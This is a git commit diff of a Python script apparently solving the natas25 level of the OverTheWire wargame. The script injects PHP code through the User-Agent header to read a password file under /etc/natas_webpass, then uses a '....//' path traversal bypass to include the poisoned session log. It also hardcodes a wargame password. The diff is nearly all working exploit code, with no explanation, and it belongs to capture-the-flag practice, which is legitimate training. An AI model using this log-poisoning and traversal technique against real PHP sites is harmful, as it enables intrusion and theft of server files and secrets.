6746890eeff4ebe45d1d3fe627afb89452a9d0da
doctormartin67 <celticfans@hotmail.com>
2022-12-04 13:40:06 +0100

    natas26

--- natas/main.py
+++ natas/main.py
@@ -1,14 +1,18 @@
 import sys
 import requests as req
 
-username = "natas24"
-password = "0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"
+username = "natas25"
+password = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"
 url = "http://%s.natas.labs.overthewire.org/" % username
 
-data = {"passwd[]": ""}
+headers = {"User-Agent": "<?php global $__GREETING; global $__MSG; global $__FOOTER; $__GREETING=\"Quote\"; $__MSG=\"crap\"; $__FOOTER=file_get_contents('/etc/natas_webpass/natas26'); ?>"}
 s = req.session()
 
-r = s.post(url, auth=(username, password), data=data)
+r = s.get(url, auth=(username, password))
+sessid = r.cookies["PHPSESSID"]
+lang = "....//logs/natas25_" + sessid + ".log"
+data = {"lang": lang}
+r = s.get(url, auth=(username, password), params=data, headers=headers)
 print(r.text)
 print(r.cookies)
 print(r.headers)
